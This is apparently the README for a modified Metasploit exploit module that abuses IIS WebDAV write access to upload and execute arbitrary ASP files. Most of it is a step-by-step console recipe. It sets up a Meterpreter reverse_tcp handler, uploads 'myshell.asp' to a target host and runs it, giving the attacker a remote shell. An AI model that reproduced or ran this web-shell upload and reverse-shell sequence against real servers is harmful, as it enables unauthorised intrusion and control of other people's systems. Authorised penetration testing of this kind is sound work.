This is a modified version of HDM's IIS WebDAV Write Access Code Execution.
I felt the need to be able to upload and execute arbitrary ASP files (such as meterpreter) to a target so I modified the original exploit to provide this capability.
The cons of using this exploit is that you may have to set up your own handler (e.g. for staged meterpreter).
/* There may be a better/nicer way then how I modified the original code but I'm not familiar with Ruby and also not a hardcore metasploit user */

One possible use case:

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST [[your IP here]]
set LPORT [[your PORT here]]
exploit -j

use exploit/windows/iis/iis_webdav_uploader
set DSTPATH /scripts/myshell.asp
set SRCPATH /var/www/html/meterpreter.asp
set RHOST [[target IP here]]
exploit
 
